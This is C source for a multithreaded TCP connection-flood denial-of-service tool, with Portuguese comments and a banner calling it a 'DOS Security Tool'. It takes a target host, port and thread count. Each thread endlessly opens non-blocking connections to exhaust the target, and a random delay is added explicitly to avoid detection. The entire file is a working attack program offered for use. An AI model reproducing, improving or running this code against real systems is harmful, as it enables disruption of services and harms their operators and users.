#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <pthread.h>
#include <netdb.h>
#include <fcntl.h>
#include <errno.h>

int conexoes_ativas = 0;
pthread_mutex_t trava = PTHREAD_MUTEX_INITIALIZER;

struct config_alvo {
    char ip[16];
    int porta;
};

void exibir_banner() {
    printf("\033[1;35m"); // Roxo/Magenta
    printf("    ██████╗ ███████╗██╗  ██╗██████╗  ██████╗ ███████╗\n");
    printf("    ██╔══██╗██╔════╝╚██╗██╔╝██╔══██╗██╔═══██╗██╔════╝\n");
    printf("    ██║  ██║█████╗   ╚███╔╝ ██║  ██║██║   ██║███████╗\n");
    printf("    ██║  ██║██╔══╝   ██╔██╗ ██║  ██║██║   ██║╚════██║\n");
    printf("    ██████╔╝███████╗██╔╝ ██╗██████╔╝╚██████╔╝███████║\n");
    printf("    ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═════╝  ╚═════╝ ╚══════╝\n");
    printf("                  DOS Security Tool                  \n");
    printf("                by D3xter | Xabaluba                 \n");
    printf("\033[0m");
    printf("-------------------------------------------------------\n");
}

void *executar_teste(void *arg) {
    struct config_alvo *alvo = (struct config_alvo *)arg;
    struct sockaddr_in serv;

    serv.sin_family = AF_INET;
    serv.sin_addr.s_addr = inet_addr(alvo->ip);
    serv.sin_port = htons(alvo->porta);

    while (1) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) {
            usleep(1000); 
            continue;
        }

        // --- MELHORIA: NON-BLOCKING MODE ---
        // Faz com que o connect não espere a resposta do servidor para continuar
        fcntl(sock, F_SETFL, O_NONBLOCK);

        int res = connect(sock, (struct sockaddr *)&serv, sizeof(serv));
        
        // No modo non-blocking, connect geralmente retorna -1 com errno EINPROGRESS
        if (res == 0 || (res < 0 && errno == EINPROGRESS)) {
            pthread_mutex_lock(&trava);
            conexoes_ativas++;
            if (conexoes_ativas % 10 == 0) { // Atualiza a cada 10 para economizar CPU
                printf("\r\033[1;32m[+]\033[0m Sockets em voo: \033[1;33m%d\033[0m", conexoes_ativas);
                fflush(stdout);
            }
            pthread_mutex_unlock(&trava);
            
            // Pequeno delay aleatório para evitar detecção imediata (0 a 10ms)
            usleep(rand() % 10000);
        } else {
            close(sock);
        }
    }
    return NULL;
}

int main(int argc, char *argv[]) {
    system("clear");
    exibir_banner();

    if (argc < 4) {
        printf("\033[1;31m[!]\033[0m Uso: %s <URL_OU_IP> <PORTA> <THREADS>\n", argv[0]);
        return 1;
    }

    struct hostent *he;
    if ((he = gethostbyname(argv[1])) == NULL) {
        printf("\033[1;31m[!]\033[0m Erro: Alvo invalido ou DNS falhou.\n");
        return 1;
    }

    char *ip_final = inet_ntoa(*(struct in_addr *)he->h_addr_list[0]);
    struct config_alvo info;
    strncpy(info.ip, ip_final, 16);
    info.porta = atoi(argv[2]);
    int num_threads = atoi(argv[3]);

    printf("[*] Target: %s [%s]\n", argv[1], ip_final);
    printf("[*] Status: \033[1;31mAtaque!\033[0m\n\n");

    pthread_t threads[num_threads];
    for (int i = 0; i < num_threads; i++) {
        pthread_create(&threads[i], NULL, executar_teste, &info);
    }

    for (int i = 0; i < num_threads; i++) {
        pthread_join(threads[i], NULL);
    }

    return 0;
}
